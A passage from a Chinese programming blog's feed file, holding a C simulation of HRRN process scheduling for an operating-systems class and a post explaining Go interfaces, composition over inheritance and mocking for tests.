class="line">index=findHighestResponseProcess(processes,currentTime); <span class="comment">// 寻找响应值最大的进程下标</span></span><br></pre></td></tr></table></figure><p>完整的代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PROCESSES 10</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> pid[<span class="number">64</span>];</span><br><span class="line">    <span class="type">char</span> state;</span><br><span class="line">    <span class="type">int</span> hasFinished;</span><br><span class="line">    <span class="type">int</span> priority;</span><br><span class="line">    <span class="type">int</span> neededTime;</span><br><span class="line">    <span class="type">int</span> totalWaitTime;</span><br><span class="line">    <span class="type">int</span> arrivalTime;</span><br><span class="line">    <span class="type">double</span> responseRatio;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> *<span class="title">next</span>;</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机生成进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">generateProcesses</span><span class="params">(<span class="keyword">struct</span> PCB processes[])</span> &#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PROCESSES; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(processes[i].pid, <span class="keyword">sizeof</span>(processes[i].pid), <span class="string">&quot;P%d&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        processes[i].state = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">        processes[i].hasFinished=<span class="number">0</span>;</span><br><span class="line">        processes[i].priority = <span class="number">0</span>;</span><br><span class="line">        processes[i].neededTime = (rand() % <span class="number">41</span>) + <span class="number">10</span>;  <span class="comment">// 随机生成需要的时间1~50</span></span><br><span class="line">        processes[i].arrivalTime = (rand() % <span class="number">20</span>) + <span class="number">1</span>;  <span class="comment">// 随机生成抵达时间1~20</span></span><br><span class="line">        processes[i].totalWaitTime = <span class="number">0</span>;</span><br><span class="line">        processes[i].responseRatio = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算响应比</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculateResponseRatio</span><span class="params">(<span class="keyword">struct</span> PCB processes[], <span class="type">int</span> currentTime)</span>&#123;</span><br><span class="line">    <span class="type">int</span> waitTime=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;NUM_PROCESSES;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (processes[i].hasFinished!=<span class="number">1</span>&amp;&amp;processes[i].arrivalTime &lt;= currentTime)&#123;</span><br><span class="line">            waitTime=currentTime-processes[i].arrivalTime;</span><br><span class="line">            <span class="comment">// 计算公式：响应比 =（等待时间+运行时间）/运行时间</span></span><br><span class="line">            processes[i].responseRatio=(waitTime+(<span class="type">double</span>)processes[i].neededTime)/processes[i].neededTime;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寻找响应比最大的进程</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">findHighestResponseProcess</span><span class="params">(<span class="keyword">struct</span> PCB processes[],<span class="type">int</span> currentTime)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index=<span class="number">-1</span>;</span><br><span class="line">    <span class="type">double</span> highestRatio=<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;NUM_PROCESSES;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (processes[i].hasFinished!=<span class="number">1</span> &amp;&amp; processes[i].responseRatio&gt;highestRatio &amp;&amp;processes[i].arrivalTime&lt;=currentTime)&#123;</span><br><span class="line">            index=i;</span><br><span class="line">            highestRatio=processes[i].responseRatio;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟HRRN调度排序器</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">HRRN</span><span class="params">(<span class="keyword">struct</span> PCB processes[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> totalWaitTime=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> currentTime=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> finishedProcesses=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Execution Order:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(finishedProcesses&lt;NUM_PROCESSES)&#123;</span><br><span class="line"></span><br><span class="line">        calculateResponseRatio(processes,currentTime); <span class="comment">// 计算响应比</span></span><br><span class="line"></span><br><span class="line">        index=findHighestResponseProcess(processes,currentTime); <span class="comment">// 寻找响应值最大的进程下标</span></span><br><span class="line">        <span class="keyword">if</span> (index==<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            currentTime++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span>* <span class="title">tmp</span>=</span>&amp;processes[index];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Process %s - Arrival Time: %d, Needed Time: %d, Wait Time: %d\n&quot;</span>,</span><br><span class="line">        tmp-&gt;pid, tmp-&gt;arrivalTime, tmp-&gt;neededTime,</span><br><span class="line">        currentTime-tmp-&gt;arrivalTime);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算总共等待的时间</span></span><br><span class="line">        tmp-&gt;totalWaitTime=currentTime-tmp-&gt;arrivalTime;</span><br><span class="line">        totalWaitTime+=tmp-&gt;totalWaitTime;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 更新进程状态和时间</span></span><br><span class="line">        tmp-&gt;hasFinished=<span class="number">1</span>;</span><br><span class="line">        currentTime+=tmp-&gt;neededTime;</span><br><span class="line">        finishedProcesses++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算等待平均时间</span></span><br><span class="line">    <span class="type">double</span> avgWaitTime = (<span class="type">double</span>)totalWaitTime / NUM_PROCESSES;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Total Wait Time: %d\n&quot;</span>, totalWaitTime);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Average Wait Time: %.2f\n&quot;</span>, avgWaitTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PCB</span> <span class="title">processes</span>[<span class="title">NUM_PROCESSES</span>];</span></span><br><span class="line">    </span><br><span class="line">    generateProcesses(processes);</span><br><span class="line"></span><br><span class="line">    HRRN(processes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241014215235225.png" alt="image-20241014215235225" /></p><p>待更新……</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/64495434_p0.jpg" alt="64495434_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>番外：Go接口的设计哲学</title>
      <link href="/posts/7a99acb03ff0/"/>
      <url>/posts/7a99acb03ff0/</url>
      
        <content type="html"><![CDATA[<h1 id="接口的设计哲学"><a class="markdownIt-Anchor" href="#接口的设计哲学"></a> 接口的设计哲学</h1><p>Go 接口定义了一组方法，但并不实现这些方法。任何类型只要实现了接口中定义的所有方法，就可以被视为该接口的实现。Go 中没有显式的 “implements” 关键字，只要类型满足接口的要求，编译器自动认定它实现了该接口。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">    Speak() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> Speak() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Woof!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> Speak() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Meow!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Dog</code> 和 <code>Cat</code> 类型都实现了 <code>Animal</code> 接口，因为它们都实现了 <code>Speak()</code> 方法。</p><h2 id="为什么go会存在接口"><a class="markdownIt-Anchor" href="#为什么go会存在接口"></a> 为什么Go会存在接口？</h2><p>Go 语言中的接口是为了增强代码的<strong>灵活性</strong>和<strong>解耦性</strong>。</p><ul><li><p>减少耦合：接口提供了抽象层，使得代码更加灵活，允许不同的实现方式。比如上例中的 <code>Animal</code> 接口可以被不同的类型实现，客户端代码不需要知道具体的类型是什么。</p><blockquote><p>耦合（Coupling）在计算机科学中，特别是在软件工程领域，指的是不同模块、组件或系统之间相互依赖的程度。这种依赖可以表现为一个模块需要知道另一个模块的内部细节以便能够正常工作，或者是一个模块直接操作或调用另一个模块的功能。</p><p>耦合度是评价软件设计质量的一个重要指标：</p><ul><li>高耦合：意味着模块间相互关联紧密，一个模块的变化可能会引起其他模块的连锁反应，导致代码难以理解和修改，同时也会降低代码的可重用性和可维护性。</li><li>低耦合：则是理想的软件设计目标，它要求模块间的关系尽量简单和间接，每个模块尽可能独立地完成自己的功能，通过明确的接口进行交互，而不是依赖于其他模块的内部实现。低耦合的系统更易于测试、扩展和维护。</li></ul></blockquote></li><li><p>简化多态性：Go 舍弃了传统的继承机制，通过接口实现了多态性。不同的类型可以通过实现同一个接口，达到同一个目的。</p></li><li><p>注重组合而非继承：Go 强调通过组合（composition）而不是继承（inheritance）来构建程序。接口鼓励将功能分解为小的、独立的部分，而不是创建复杂的继承体系。</p><blockquote><p>组合优于继承。</p><p>我们有一只鸭子和一只鸡，他们工作得很好。</p><p>我们发现鸭子和鸡有很多重复的地方，他们都会飞，都有两只脚两个翅膀，都会唧唧或者嘎嘎叫。</p><p>于是我们抽象出鸟这个父类，鸭子和鸡都继承了鸟这个父类， 当我们想要在飞的时候额外做点什么，只需要修改鸟就好了，代码得到了缩减，维护起来看似方便了。</p><p>鸟工作得也很好。</p><p>我们业务不断扩展，企鹅出现了。 它不会飞，但是会游泳。</p><p>鸟的工作出了问题，于是我们把飞行这个功能被下沉到了会飞的鸟类，企鹅继承自一个不会飞的鸟类。</p><p>接下来橡皮鸭子出现了，人们对于它究竟是不是鸟有了争议。开始浪费时间大量的讨论什么是鸟，鸟该做些什么。</p><p>……</p><p>但我们的生活中没有鸟（请注意这句话），鸟是一个抽象， 我们生活中有鸡，有鸭。我们觉得他们有一些相同的地方，于是把拥有这些相同点的东西叫做鸟，但永远不知道下一个遇见的，能不能算鸟， 鸟的定义要不要修改。</p><p>这就是继承不适用的原因，让我们看看组合会怎么样。</p><p>我们找到了鸡和鸭的共同点， 会飞，两只脚，两个翅膀，会叫。 这些东西加上其他的特质『组合』成了鸡或鸭。 会飞这个能力就能提出来，使用在每一个需要飞行能力的地方。 当我遇到企鹅，就不用拿飞行来『组合』它。</p><p>飞行，不应该是鸡或鸭从父类继承的能力，而应该是『飞行能力』组合成了鸡鸭的一部分。</p></blockquote></li></ul><h2 id="设计概念"><a class="markdownIt-Anchor" href="#设计概念"></a> 设计概念</h2><p>Go 的设计哲学是 “简单就是美” 和 “清晰胜于复杂”。Go 的接口（interface）是 Go 语言中一个核心的概念，源自其设计哲学，特别是简洁性、组合性和类型系统的灵活性。</p><p>通过对比“面向接口编程”和“面向对象编程”可以更加清晰的总结出接口的特点。Go 的接口虽然有一些与面向对象编程（OOP）类似的特性，但它本质上与传统 OOP 有很大的不同。</p><p>两者虽然都能实现<strong>多态</strong>和<strong>抽象</strong>。但在OOP中，多态性是通过继承和虚方法实现的，而 Go 是通过接口实现类似的效果。不同的类型可以实现相同的接口，提供不同的行为；Go 的接口也能像 OOP 中的抽象类一样，提供了抽象层，隐藏具体实现。</p><p>与OOP相比，Go没有继承，且接口隐式实现；没有类的层级结构，且比OOP更加灵活。</p><ul><li>没有继承：Go 中没有类和继承的概念。传统 OOP 中通过继承共享行为，而 Go 更倾向于通过组合和接口来共享行为。Go 强调 “组合优于继承”。</li><li>接口是隐式的：在 OOP 中，类必须显式地声明实现某个接口（如 <code>implements</code> 关键字），而 Go 则通过隐式实现接口，大大减少了依赖和耦合。</li><li>接口的灵活性：由于 Go 的接口是隐式实现的，它更加灵活。你可以在任何时候给一个类型添加方法使其符合某个接口，而不需要修改原始类型或重新定义继承关系。</li><li>没有类的层级结构：OOP 中的类通常有层级结构，子类继承父类的行为，而在 Go 中，接口没有层级结构，类型通过实现接口的具体方法与接口关联。Go 倾向于&quot;平面化&quot;的设计，没有复杂的层级关系。</li></ul><table><thead><tr><th>特性</th><th>面向接口编程</th><th>面向对象编程</th></tr></thead><tbody><tr><td><strong>关注点</strong></td><td>行为抽象，关注方法签名（接口定义的方法）</td><td>数据和行为结合，关注类的继承和封装</td></tr><tr><td><strong>核心机制</strong></td><td>通过接口实现解耦合和多态性，通常依赖组合而不是继承</td><td>通过类继承来实现代码复用和多态性</td></tr><tr><td><strong>耦合性</strong></td><td>低耦合，模块之间通过接口通信，易于替换实现</td><td>较高耦合，类的层次结构带来依赖，修改某些类可能影响其子类</td></tr><tr><td><strong>实现灵活性</strong></td><td>高灵活性，通过组合和替换实现可扩展系统</td><td>中等灵活性，依赖类的继承体系和多态，层级关系带来复杂性</td></tr><tr><td><strong>方法重用</strong></td><td>通过实现同一接口的多个实现来重用逻辑</td><td>通过继承和方法覆盖来重用父类的逻辑</td></tr><tr><td><strong>典型应用场景</strong></td><td>通常用于依赖注入、模块化系统设计、可替换的行为逻辑</td><td>通常用于具有层次化结构的业务场景，需要复用和扩展对象的功能</td></tr><tr><td><strong>设计哲学</strong></td><td>强调功能分离，使用接口解耦系统</td><td>强调类的继承关系，使用对象封装和多态</td></tr></tbody></table><h2 id="运用举例"><a class="markdownIt-Anchor" href="#运用举例"></a> 运用举例</h2><blockquote><p>Q：假如一个数据结构实现了某接口，然后呢？我的意思是接口定义了一系列方法，数据类型实现了接口定义的方法，直接调用它的方法便是，接口的存在有什么用呢？是否有些多余了。</p></blockquote><p>接口的存在看起来像是额外的一层抽象，而实际用处似乎并不明显，特别是在你只想直接调用方法的时候。实际上，Go 的接口在某些场景中确实是为了应对特定的设计需求，让代码在灵活性和解耦性方面表现更好。可以从以下几个场景加深理解。</p><h3 id="面向抽象编程降低耦合"><a class="markdownIt-Anchor" href="#面向抽象编程降低耦合"></a> 面向抽象编程，降低耦合</h3><p>假设你编写了一个函数，它只依赖某个具体的数据结构，那么这个函数的用途非常局限，必须依赖该具体实现。如果将依赖改为接口，那么这个函数可以接受任何实现了该接口的类型，极大提升了复用性和灵活性。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ProcessAnimal</span><span class="params">(a Animal)</span></span> &#123;</span><br><span class="line">    fmt.Println(a.Speak())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dog := Dog&#123;&#125;</span><br><span class="line">cat := Cat&#123;&#125;</span><br><span class="line">ProcessAnimal(dog) <span class="comment">// &quot;Woof!&quot;</span></span><br><span class="line">ProcessAnimal(cat) <span class="comment">// &quot;Meow!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的 <code>ProcessAnimal</code> 函数并不需要知道具体传入的类型是 <code>Dog</code> 还是 <code>Cat</code>，只要它们实现了 <code>Animal</code> 接口即可。这降低了耦合性，如果后续有新的类型如 <code>Bird</code> 实现了 <code>Animal</code> 接口，<code>ProcessAnimal</code> 函数可以不做任何修改直接处理 <code>Bird</code>。</p><h3 id="代码解耦和模块化"><a class="markdownIt-Anchor" href="#代码解耦和模块化"></a> 代码解耦和模块化</h3><p>接口可以将代码的依赖关系从具体实现中解耦。例如，在开发中，经常需要通过接口定义来编写可替换的模块。当系统需要更换某个模块的具体实现时，不需要改动依赖它的代码，只需要提供符合接口定义的新实现。</p><p>比如，你可能有一个数据存储模块，最开始是用内存存储数据，但后来你希望用数据库存储。通过接口，你可以轻松实现不同的存储方式。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Storage <span class="keyword">interface</span> &#123;</span><br><span class="line">    Save(data <span class="type">string</span>) <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MemoryStorage <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m MemoryStorage)</span></span> Save(data <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Saving to memory:&quot;</span>, data)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DatabaseStorage <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d DatabaseStorage)</span></span> Save(data <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Saving to database:&quot;</span>, data)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 业务代码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StoreData</span><span class="params">(s Storage, data <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    s.Save(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">memStore := MemoryStorage&#123;&#125;</span><br><span class="line">dbStore := DatabaseStorage&#123;&#125;</span><br><span class="line"></span><br><span class="line">StoreData(memStore, <span class="string">&quot;sample data&quot;</span>) <span class="comment">// &quot;Saving to memory: sample data&quot;</span></span><br><span class="line">StoreData(dbStore, <span class="string">&quot;sample data&quot;</span>)  <span class="comment">// &quot;Saving to database: sample data&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在不修改 <code>StoreData</code> 业务代码的前提下，存储方式可以灵活切换。这种解耦方式使得代码更加模块化，也更加易于维护和扩展。</p><h3 id="方便测试"><a class="markdownIt-Anchor" href="#方便测试"></a> 方便测试</h3><p>接口在测试中的作用尤为明显。通过接口，你可以轻松替换实现，编写 mock（模拟）对象来替代实际的实现，从而进行单元测试。这样你可以独立测试依赖了接口的业务逻辑，而不依赖实际的复杂实现。</p><p>比如在上一个例子中，你可以为 <code>Storage</code> 接口创建一个 mock 对象，用来测试依赖 <code>StoreData</code> 函数的代码，而不需要实际保存数据。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MockStorage <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m MockStorage)</span></span> Save(data <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Mock saving data:&quot;</span>, data)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mockStore := MockStorage&#123;&#125;</span><br><span class="line">StoreData(mockStore, <span class="string">&quot;test data&quot;</span>) <span class="comment">// &quot;Mock saving data: test data&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过使用 <code>MockStorage</code>，你不需要真的去处理存储问题，而是能专注于测试业务逻辑。</p><h3 id="动态多态性"><a class="markdownIt-Anchor" href="#动态多态性"></a> 动态多态性</h3><p>Go 的接口提供了动态多态性，可以通过接口来处理不同类型的对象，而不需要知道它们的具体类型。这在某些场景下非常有用，例如处理不同类型的请求、消息或处理策略。</p><p>例如，定义一个空接口 <code>interface&#123;&#125;</code>，你可以使用它来处理任意类型的对象：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PrintValue</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PrintValue(<span class="number">42</span>)       <span class="comment">// 打印 42</span></span><br><span class="line">PrintValue(<span class="string">&quot;hello&quot;</span>)  <span class="comment">// 打印 hello</span></span><br><span class="line">PrintValue(<span class="literal">true</span>)     <span class="comment">// 打印 true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种基于接口的动态类型特性，使得代码可以处理更多种类的输入。一般会结合<code>switch</code>根据输入数据的数据类型来执行不同的操作。</p><h3 id="延迟实现的灵活性"><a class="markdownIt-Anchor" href="#延迟实现的灵活性"></a> 延迟实现的灵活性</h3><p>接口不仅仅是为了当前的实现考虑。它还允许程序设计者在将来的实现中扩展程序功能。例如，你可以设计好接口但暂时不去实现，或者根据用户需求在未来实现更多接口。</p><h2 id="为什么提倡面向接口编程"><a class="markdownIt-Anchor" href="#为什么提倡面向接口编程"></a> 为什么提倡面向接口编程？</h2><p>从初学C语言的面向过程编程，到C++、Python的面向对象编程，最后到Go的面向接口编程，可以看出这里面编程的思想是逐步递进的关系。为什么要提倡面向接口编程，原因在于面向对象编程出现了一些无法避免的缺陷。</p><p>先来谈谈为什么要面向接口编程吧。</p><h3 id="面向接口编程的好处"><a class="markdownIt-Anchor" href="#面向接口编程的好处"></a> 面向接口编程的好处</h3><p>正如前文所提到的，使用接口编程最明显的好处在于<strong>解耦</strong>。说穿了，也就是“方便维护和扩展”，因为“规范和实现分离”。对于平面化的组合接口编程来说，这是对层级化的继承对象编程得天独厚的优势。</p><p>但是实体类也未见得做不到这一点。我们完全可以让顶级实体类只提供空方法，而留待具体实现类提供实现的细节。但是，这么做会导致顶级实体类对子类的控制力减弱，因为顶级实体类无法规定方法的实现。用抽象类可以吗？一个只定义了抽象方法的抽象类在本质上和接口是没有区别的。</p><p>那么为什么要用接口而不使用抽象类编程呢？这就要涉及到面对对象编程无法避免的缺陷问题了。</p><h3 id="类继承的缺陷"><a class="markdownIt-Anchor" href="#类继承的缺陷"></a> 类继承的缺陷</h3><p>先行者们发现，类继承有一些无法避免的缺陷。</p><h4 id="父类的实现细节会影响子类的行为"><a class="markdownIt-Anchor" href="#父类的实现细节会影响子类的行为"></a> 父类的实现细节会影响子类的行为</h4><p>这句话看上去是理所当然的，但如果父类的实现导致子类出现了bug呢？</p><blockquote><p>要知道，封装可是面向对象最引以为傲的卖点之一，其一大目标就是：你不用管我的具体实现逻辑，只需要知道传入参数和返回值就行了。但这个目标却被面向对象的另一引以为傲的卖点——继承，打破了。</p></blockquote><p>导致子类出现bug的原因来自于类继承编程中重要却潜在冲突的两个要点：封装和继承。一般来说，封装隐藏了程序的具体实现细节，提供了一层新的抽象；继承则允许程序员在封装好的代码的基础上进行拓展，由于封装隐藏了具体的代码实现，所以程序员能够较为容易的上手共同开发。</p><p>但是，继承其实破坏了封装。<strong>封装</strong>的核心理念是隐藏类的实现细节，让使用者只需关心输入和输出，而不必了解内部的实现逻辑。然而，<strong>继承</strong>引入了问题，因为子类不仅依赖父类的接口（即方法的签名），还依赖父类的具体实现。这样一来，父类的实现细节变得对子类是透明的，这<strong>破坏了封装</strong>的初衷。</p><p>在设计良好的面向对象系统中，子类通常应该只依赖父类的接口（即公开方法），而不应该依赖父类的实现细节。可实际上，由于子类会继承并使用父类的方法，子类不可避免地依赖了父类的实现逻辑。这意味着，如果父类的实现发生改变（即使父类内部逻辑改变没有违反其方法的契约），子类的行为也可能随之发生变化，从而引发<strong>潜在的Bug</strong>。</p><p>这种问题在继承体系中非常常见，因为子类可能会<strong>无意中依赖</strong>父类的特定实现细节，而当这些细节发生变化时，子类的行为可能会变得不可预测。</p><h4 id="子类的实现可能会影响父类"><a class="markdownIt-Anchor" href="#子类的实现可能会影响父类"></a> 子类的实现可能会影响父类</h4><blockquote><p>如果说子类被父类影响还算情有可原的话，那么父类被子类影响实在是有点说不过去了。</p></blockquote><p>在 Java 等面向对象语言中，父类的构造器在执行时，可能会调用父类中定义的方法。然而，如果这些方法在子类中被覆盖，那么当父类构造器调用该方法时，实际上调用的是<strong>子类的实现</strong>。此时，<strong>子类的构造器尚未完全执行，子类的成员变量尚未被初始化</strong>，这会导致严重的错误。</p><p>这暴露了面向对象编程中的一个常见问题，即在<strong>父类的构造器中调用可被子类覆盖的方法</strong>可能导致意外的行为，特别是在父类构造期间子类的状态尚未完全初始化的情况下。这会引发一系列问题。</p><h3 id="怎么办"><a class="markdownIt-Anchor" href="#怎么办"></a> 怎么办？</h3><p>答案是使用接口编程。</p><blockquote><p>因为接口可以避免类继承的所有问题。</p><p>纵观类继承所引起的问题，都是由于其可被实例化造成的，而接口是不可被实例化的，所以其可以避免所有这些问题。由于其不能被实例化，所以不需要在其内部定义非static或非public的属性，进而导致定义非final的属性也是不恰当的（因为一个随时可被任何人随意修改的属性不符合面向对象的价值观）；由于其不能被实例化，所以也不需要定义方法的实现，进而导致类可以实现多个接口而不至于担心不同接口出现相同方法签名却有不同实现的冲突</p></blockquote><p>总结一下，<strong>就是类可以被实例化，而接口不会</strong>。从而避免了一系列因类继承引起的一切问题。</p><h2 id="接口的优劣"><a class="markdownIt-Anchor" href="#接口的优劣"></a> 接口的优劣</h2><p>在设计哲学这一章，我们小结一下接口的优缺点。</p><p>优点：</p><ul><li><strong>简洁和灵活</strong>：接口提供了简洁的多态性，避免了复杂的类层次结构。</li><li><strong>松耦合设计</strong>：通过接口，代码可以变得更加模块化，便于测试和扩展。</li><li><strong>隐式实现减少代码依赖</strong>：不需要显式声明类型实现了接口，代码更加灵活且不需要维护冗余的关系。</li></ul><p>缺点：</p><ul><li><strong>没有继承的代码复用</strong>：没有继承意味着 Go 缺少一种直接的代码复用机制。在某些情况下，继承可以减少重复代码的编写，而 Go 依赖组合来实现类似功能。</li><li><strong>灵活但不够强制</strong>：隐式实现虽然增加了灵活性，但缺乏 OOP 中的显式关系，有时可能使得代码的结构性和可读性稍弱。</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><p><a href="https://blog.csdn.net/qq_33240556/article/details/136147169">什么是耦合？_计算机中的耦合-CSDN博客</a></p><p><a href="https://www.zhihu.com/question/511958588/answer/3137705299">(3 封私信) 为什么go和rust语言都舍弃了继承？ - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/jifengnan/article/details/85411115">为什么提倡面向接口编程_at father.(father. java:2)-CSDN博客</a></p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/d367a38091cb770dfa360d3dbf289740.png" alt="d367a38091cb770dfa360d3dbf289740" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9月总结·2024</title>
      <link href="/posts/186ad852eeaf/"/>
      <url>/posts/186ad852eeaf/</url>
      
